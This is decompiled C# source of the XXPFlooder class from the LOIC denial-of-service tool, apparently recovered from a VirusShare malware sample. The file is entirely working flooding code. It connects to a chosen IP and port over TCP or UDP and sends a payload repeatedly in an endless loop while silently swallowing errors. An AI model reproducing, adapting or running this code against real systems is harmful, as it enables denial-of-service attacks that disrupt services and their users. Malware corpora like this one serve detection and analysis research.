// Decompiled with JetBrains decompiler
// Type: LOIC.XXPFlooder
// Assembly: LOIC, Version=1.0.6.0, Culture=neutral, PublicKeyToken=054abc0e0ef9de83
// MVID: 7AC305AB-446C-4C63-AD73-EDE805EB60DD
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\HackTool.MSIL.Loic.bj-1d5fc634f976dc3c3f339e46365af78940cb1f49caa46e76e70f7c6ce8dad089.exe

using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace LOIC
{
  internal class XXPFlooder : IFlooder
  {
    public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data)
    {
      this.IP = ip;
      this.Port = port;
      this.Protocol = proto;
      this.Delay = delay;
      this.Resp = resp;
      this.Data = data;
    }

    public bool IsFlooding { get; set; }

    public int FloodCount { get; set; }

    public string IP { get; set; }

    public int Port { get; set; }

    public int Protocol { get; set; }

    public int Delay { get; set; }

    public bool Resp { get; set; }

    public string Data { get; set; }

    public void Start()
    {
      this.IsFlooding = true;
      BackgroundWorker backgroundWorker = new BackgroundWorker();
      backgroundWorker.DoWork += new DoWorkEventHandler(this.bw_DoWork);
      backgroundWorker.RunWorkerAsync();
    }

    private void bw_DoWork(object sender, DoWorkEventArgs e)
    {
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes(this.Data);
        IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(this.IP), this.Port);
        while (this.IsFlooding)
        {
          if (this.Protocol == 1)
          {
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            {
              Blocking = this.Resp
            };
            socket.Connect((EndPoint) remoteEP);
            try
            {
              while (this.IsFlooding)
              {
                ++this.FloodCount;
                socket.Send(bytes);
                if (this.Delay > 0)
                  Thread.Sleep(this.Delay);
              }
            }
            catch
            {
            }
          }
          if (this.Protocol == 2)
          {
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
            {
              Blocking = this.Resp
            };
            try
            {
              while (this.IsFlooding)
              {
                ++this.FloodCount;
                socket.SendTo(bytes, SocketFlags.None, (EndPoint) remoteEP);
                if (this.Delay > 0)
                  Thread.Sleep(this.Delay);
              }
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
    }
  }
}
